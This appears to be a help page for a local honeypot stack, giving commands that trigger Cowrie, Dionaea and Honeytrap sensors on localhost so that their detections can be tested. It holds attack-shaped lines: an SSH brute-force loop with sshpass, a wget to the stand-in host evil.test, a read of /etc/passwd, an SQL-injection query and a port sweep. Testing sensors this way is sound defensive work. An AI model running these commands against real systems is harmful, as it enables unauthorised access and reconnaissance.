Terminal commands — trigger the honeypots from your Mac

    
Paste into a normal macOS Terminal (not inside Docker) — the stack publishes each sensor's port straight to localhost, so these hit the real Cowrie/Dionaea/Honeytrap containers over the network exactly like a real attacker would. No login on this page needed for these; each command is verified working as written. Every attempt is really captured — it lands in Event Log within a few seconds and in the Credentials Vault too, for the SSH ones.


    

      
1. SSH login — real session→ SSH CREDENTIAL CAPTURE

      
Logs in with a real username/password Cowrie accepts, then runs commands inside the fake shell. The username + password you type is captured and shows up in the Credentials Vault page as a real entry — this is the one to use if you want a credential to show up.

      
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null oracle@localhost
# password: oracle   (Cowrie will accept it)
# once you're in, try:
whoami; id; uname -a; cat /etc/passwd; wget http://evil.test/x; ls -la /tmp; exit

      
Captures: oracle / oracle in the vault, a full command session in Event Log, and (if you run the wget line) a payload-download detection.

    


    

      
2. SSH brute force → then a successful login→ SSH CREDENTIAL CAPTURE (×5)

      
4 rejected passwords for root, then a 5th that's accepted (hunter2) — the exact fail-then-succeed shape the st-cred-002 brute-force detection looks for. All 5 attempts are captured as separate credential rows, the 4 failed ones marked as rejected. Needs sshpass (brew install hudochenkov/sshpass/sshpass) so it doesn't stop and ask you for a password 5 times.

      
for pw in 123456 password root toor; do
  sshpass -p "$pw" ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=4 root@localhost exit 2>/dev/null
done
sshpass -p hunter2 ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  root@localhost "id; whoami; exit"

      
Captures: root / 123456, password, root, toor (all rejected) then root / hunter2 (accepted) — 5 rows in Credentials Vault, plus a CRITICAL brute-force incident.

    


    

      
3. Telnet connect→ Cowrie Telnet

      
Just a TCP connect — no login prompt is answered, so nothing lands in the credential vault. Confirms the Telnet listener is alive.

      
nc -zv localhost 2223   # or: telnet localhost 2223

      
Captures: a Cowrie connect event in Event Log. No credential (you didn't send one).

    


    

      
4. Dionaea — SMB / anonymous FTP / MSSQL→ Dionaea

      
Touches all three Dionaea ports. The FTP line logs in as anonymous — captured as an FTP credential, though it's not a secret since anonymous FTP is meant to be public.

      
nc -zv -w2 localhost 445
curl -s -m3 "ftp://anonymous:test@localhost:2121/"
nc -zv -w2 localhost 1433

      
Captures: SMB + MSSQL connect events, one anonymous FTP credential row.

    


    

      
5. Honeytrap — HTTP request + SQL-injection-shaped request→ Honeytrap

      
A plain GET, then a request with a classic ' OR '1'='1 payload in the query string. Honeytrap doesn't speak full HTTP back, so curl may print a connection error on the second line — that's expected, the request still reaches the sensor and gets logged.

      
curl -s -m4 "http://localhost:8022/"
curl -s -m4 "http://localhost:8023/?id=1%27%20OR%20%271%27=%271"

      
Captures: two Honeytrap events in Event Log. No credential — this port doesn't do logins.

    


    

      
6. Full port sweep — every sensor at once→ all sensors

      
One-liner reconnaissance scan across every published honeypot port. Good smoke test that the whole stack is up.

      
for p in 2222 2223 445 2121 1433 8022 8023; do nc -zv -w1 localhost $p; done

      
Captures: a connect event per sensor. No credential.
